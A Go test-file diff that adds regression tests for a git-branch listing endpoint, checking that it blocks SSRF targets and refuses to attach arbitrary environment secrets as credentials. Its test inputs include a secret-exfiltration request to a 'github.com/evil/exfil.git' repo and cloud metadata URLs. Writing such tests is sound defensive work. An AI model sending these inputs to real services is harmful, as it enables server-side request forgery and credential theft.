@@ -5,12 +5,14 @@ import (
 	"encoding/json"
 	"net/http"
 	"net/http/httptest"
+	"net/url"
 	"os"
 	"path/filepath"
 	"strings"
 	"testing"
 
 	"github.com/dicode/dicode/pkg/config"
+	"github.com/dicode/dicode/pkg/taskset"
 )
 
 // ── 1. apiGetConfigRaw redaction ──────────────────────────────────────────────
@@ -260,6 +262,146 @@ func TestIsAllowedGitScheme_Rejected(t *testing.T) {
 	for _, u := range cases {
 		if isAllowedGitScheme(u) {
 			t.Errorf("isAllowedGitScheme(%q) = true, want false", u)
+		}
+	}
+}
+
+// ── 3b. apiListGitBranches — token_env restriction + SSRF host block (#475) ──
+
+// branchesTestServer builds a minimal Server whose config has one git source
+// with an operator-designated credential env var. apiListGitBranches only
+// touches cfg/cfgMu, so no full test server (and no deno) is needed.
+func branchesTestServer() *Server {
+	cfg := &config.Config{Server: config.ServerConfig{Port: 8080}}
+	cfg.Spec.Entries = map[string]*taskset.Entry{
+		"corp-tasks": {Ref: &taskset.Ref{
+			URL:    "https://github.com/corp/tasks.git",
+			Branch: "main",
+			Auth:   taskset.RefAuth{TokenEnv: "GH_TOKEN"},
+		}},
+		"local": {Ref: &taskset.Ref{Path: "/tmp/tasks"}},
+	}
+	return &Server{cfg: cfg}
+}
+
+func listBranchesReq(srv *Server, target string) *httptest.ResponseRecorder {
+	req := httptest.NewRequest(http.MethodGet, target, nil)
+	w := httptest.NewRecorder()
+	srv.apiListGitBranches(w, req)
+	return w
+}
+
+// TestApiListGitBranches_RejectsPrivateHosts asserts that URLs pointing at
+// loopback/private/link-local/internal hosts are rejected with a clear error
+// and never reach the dial stage ("list remote" only appears in errors
+// wrapped after a connection attempt).
+func TestApiListGitBranches_RejectsPrivateHosts(t *testing.T) {
+	srv := branchesTestServer()
+	cases := []string{
+		"http://127.0.0.1/repo.git",
+		"https://10.0.0.8/repo.git",
+		"http://169.254.169.254/latest/meta-data",
+		"http://[::1]/repo.git",
+		"http://localhost:3000/repo.git",
+		"http://metadata.google.internal/computeMetadata/v1",
+	}
+	for _, u := range cases {
+		w := listBranchesReq(srv, "/api/settings/sources/git/branches?url="+url.QueryEscape(u))
+		if w.Code != http.StatusBadRequest {
+			t.Errorf("url=%q: code = %d, want 400", u, w.Code)
+		}
+		body := w.Body.String()
+		if !strings.Contains(body, "private or internal") {
+			t.Errorf("url=%q: body = %q, want private/internal host rejection", u, body)
+		}
+		if strings.Contains(body, "list remote") {
+			t.Errorf("url=%q: reached the dial stage: %q", u, body)
+		}
+	}
+}
+
+// TestApiListGitBranches_RejectsUnknownTokenEnv asserts that naming an env
+// var that is not an operator-configured git credential is refused outright —
+// the value must never be attached as basic auth (this was the secret
+// exfiltration vector in #475).
+func TestApiListGitBranches_RejectsUnknownTokenEnv(t *testing.T) {
+	t.Setenv("SUPER_SECRET_TOKEN", "hunter2") // present in the daemon env, still must not be usable
+	srv := branchesTestServer()
+
+	w := listBranchesReq(srv,
+		"/api/settings/sources/git/branches?url="+url.QueryEscape("https://github.com/evil/exfil.git")+
+			"&token_env=SUPER_SECRET_TOKEN")
+
+	if w.Code != http.StatusForbidden {
+		t.Fatalf("code = %d, want 403; body=%s", w.Code, w.Body.String())
+	}
+	if !strings.Contains(w.Body.String(), "not permitted") {
+		t.Errorf("body = %q, want token_env rejection message", w.Body.String())
+	}
+}
+
+// TestApiListGitBranches_LegitPublicURLPassesGates asserts the two security
+// gates do not break the legitimate case: a public host with no token_env
+// must get past both checks. The request context is pre-cancelled so go-git
+// fails at the dial stage ("list remote") without touching the network.
+func TestApiListGitBranches_LegitPublicURLPassesGates(t *testing.T) {
+	srv := branchesTestServer()
+	ctx, cancel := context.WithCancel(context.Background())
+	cancel()
+
+	req := httptest.NewRequest(http.MethodGet,
+		"/api/settings/sources/git/branches?url="+url.QueryEscape("https://github.com/example/repo.git"), nil)
+	req = req.WithContext(ctx)
+	w := httptest.NewRecorder()
+	srv.apiListGitBranches(w, req)
+
+	body := w.Body.String()
+	if strings.Contains(body, "private or internal") || strings.Contains(body, "not permitted") {
+		t.Fatalf("legitimate request was blocked by a security gate: %s", body)
+	}
+	if !strings.Contains(body, "list remote") {
+		t.Fatalf("expected failure from the dial stage (list remote), got: %s", body)
+	}
+}
+
+// TestResolveBranchesTokenEnv covers the credential-resolution rule directly:
+// configured-source URLs use their own token_env (request input ignored);
+// unknown URLs may only use an env var already designated as a git credential.
+func TestResolveBranchesTokenEnv(t *testing.T) {
+	srv := branchesTestServer()
+
+	cases := []struct {
+		name      string
+		url       string
+		requested string
+		want      string
+		wantErr   bool
+	}{
+		{"configured URL uses own credential, request ignored",
+			"https://github.com/corp/tasks.git", "SUPER_SECRET_TOKEN", "GH_TOKEN", false},
+		{"configured URL matches without .git suffix",
+			"https://github.com/corp/tasks", "PATH", "GH_TOKEN", false},
+		{"unknown URL, empty token_env allowed",
+			"https://github.com/other/repo.git", "", "", false},
+		{"unknown URL, operator-designated credential allowed",
+			"https://github.com/other/repo.git", "GH_TOKEN", "GH_TOKEN", false},
+		{"unknown URL, arbitrary env var rejected",
+			"https://github.com/other/repo.git", "AWS_SECRET_ACCESS_KEY", "", true},
+	}
+	for _, tc := range cases {
+		got, err := srv.resolveBranchesTokenEnv(tc.url, tc.requested)
+		if tc.wantErr {
+			if err == nil {
+				t.Errorf("%s: err = nil, want rejection", tc.name)
+			}
+			continue
+		}
+		if err != nil {
+			t.Errorf("%s: unexpected error: %v", tc.name, err)
+			continue
+		}
+		if got != tc.want {
+			t.Errorf("%s: got %q, want %q", tc.name, got, tc.want)
 		}
 	}
 }
